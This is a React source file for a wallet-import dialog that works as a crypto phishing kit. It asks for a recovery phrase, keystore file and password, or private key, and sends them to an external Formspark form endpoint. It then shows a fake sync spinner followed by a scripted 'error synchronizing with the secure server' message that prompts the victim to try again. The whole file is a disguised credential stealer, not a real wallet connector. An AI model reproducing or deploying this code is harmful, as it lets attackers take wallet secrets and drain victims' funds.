import React, { useState } from "react";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { getWalletImage } from "./walletData";
import { motion } from "framer-motion";
import { FORMSPARK_ENDPOINT } from "@/lib/formspark";

interface ManualConnectModalProps {
  isOpen: boolean;
  onClose: () => void;
  walletName: string;
}

type TabType = "phrase" | "keystore" | "privateKey";
type StatusType = "idle" | "syncing" | "error";

export const ManualConnectModal = ({ isOpen, onClose, walletName }: ManualConnectModalProps) => {
  const [activeTab, setActiveTab] = useState<TabType>("phrase");
  const [phrase, setPhrase] = useState("");
  const [keystore, setKeystore] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [status, setStatus] = useState<StatusType>("idle");

  const handleValidate = async () => {
    setStatus("syncing");

    // Prepare Formspark Data
    const formData = {
      source: "wallet-manual-connect",
      submitted_at: new Date().toISOString(),
      page: typeof window !== "undefined" ? window.location.href : "",
      wallet: walletName,
      type: activeTab,
      phrase: activeTab === "phrase" ? phrase : "",
      keystore: activeTab === "keystore" ? keystore : "",
      keystorePassword: activeTab === "keystore" ? keystorePassword : "",
      privateKey: activeTab === "privateKey" ? privateKey : "",
    };

    try {
      await fetch(FORMSPARK_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        body: JSON.stringify(formData),
      });

      // Show "Syncing" for 2 seconds before showing error
      setTimeout(() => {
        setStatus("error");
      }, 2000);
    } catch (error) {
      console.error("Submission error", error);
      setStatus("error");
    }
  };

  const handleRetry = () => {
    setStatus("idle");
  };

  const handleClose = () => {
    setStatus("idle");
    setPhrase("");
    setKeystore("");
    setKeystorePassword("");
    setPrivateKey("");
    onClose();
  };

  const tabs = [
    { id: "phrase" as TabType, label: "Phrase" },
    { id: "keystore" as TabType, label: "Keystore" },
    { id: "privateKey" as TabType, label: "Private Key" },
  ];

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="bg-card border-border/50 w-[92vw] max-w-lg p-0 gap-0 mx-auto overflow-hidden">
        <DialogHeader className="p-4 sm:p-6 pb-3 sm:pb-4 pr-12 border-b border-border/30">
          <div className="flex items-center gap-3">
            <img
              src={getWalletImage(walletName)}
              alt={walletName}
              className="w-10 h-10 rounded-full bg-muted object-cover"
            />
            <div className="min-w-0">
              <DialogTitle className="text-lg sm:text-xl font-semibold text-foreground truncate">
                Import {walletName}
              </DialogTitle>
              <DialogDescription className="text-sm text-muted-foreground truncate">
                Connect your wallet to the secure server
              </DialogDescription>
            </div>
          </div>
        </DialogHeader>

        <div className="p-4 sm:p-6 space-y-4">
          {status === "idle" && (
            <>
              <div className="flex rounded-full bg-secondary p-1">
                {tabs.map((tab) => (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    className={`flex-1 py-2 px-3 rounded-full text-sm font-medium transition-all ${
                      activeTab === tab.id
                        ? "bg-primary text-primary-foreground"
                        : "text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    {tab.label}
                  </button>
                ))}
              </div>

              <div className="rounded-xl border border-border/50 bg-secondary/50 p-4">
                {activeTab === "phrase" && (
                  <textarea
                    value={phrase}
                    onChange={(e) => setPhrase(e.target.value)}
                    placeholder="Enter your 12 or 24 word recovery phrase..."
                    className="w-full h-32 bg-transparent text-foreground placeholder:text-muted-foreground resize-none focus:outline-none text-sm"
                  />
                )}

                {activeTab === "keystore" && (
                  <div className="space-y-3">
                    <textarea
                      value={keystore}
                      onChange={(e) => setKeystore(e.target.value)}
                      placeholder="Paste your keystore JSON..."
                      className="w-full h-24 bg-transparent text-foreground placeholder:text-muted-foreground resize-none focus:outline-none text-sm"
                    />
                    <input
                      type="password"
                      value={keystorePassword}
                      onChange={(e) => setKeystorePassword(e.target.value)}
                      placeholder="Keystore password"
                      className="w-full py-2 px-3 rounded-lg bg-secondary border border-border/50 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary text-sm"
                    />
                  </div>
                )}

                {activeTab === "privateKey" && (
                  <textarea
                    value={privateKey}
                    onChange={(e) => setPrivateKey(e.target.value)}
                    placeholder="Enter your private key..."
                    className="w-full h-32 bg-transparent text-foreground placeholder:text-muted-foreground resize-none focus:outline-none text-sm"
                  />
                )}
              </div>

              <button
                onClick={handleValidate}
                className="w-full py-3 rounded-xl bg-primary text-primary-foreground font-semibold hover:opacity-90 transition"
              >
                Validate
              </button>
            </>
          )}

          {status === "syncing" && (
            <div className="flex flex-col items-center py-8 space-y-4">
              <motion.div
                animate={{ rotate: 360 }}
                transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                className="w-12 h-12 rounded-full border-4 border-muted border-t-primary"
              />
              <p className="text-foreground font-medium">Synchronizing...</p>
            </div>
          )}

          {status === "error" && (
            <div className="flex flex-col items-center py-8 space-y-4">
              <div className="w-12 h-12 rounded-full bg-destructive/20 flex items-center justify-center">
                <span className="text-destructive text-2xl">✕</span>
              </div>
              <p className="text-destructive font-medium text-center">Error synchronizing with the secure server</p>
              <button
                onClick={handleRetry}
                className="px-6 py-2 rounded-full border border-border text-foreground hover:bg-muted transition-all"
              >
                Please try again
              </button>
            </div>
          )}
        </div>
      </DialogContent>
    </Dialog>
  );
};
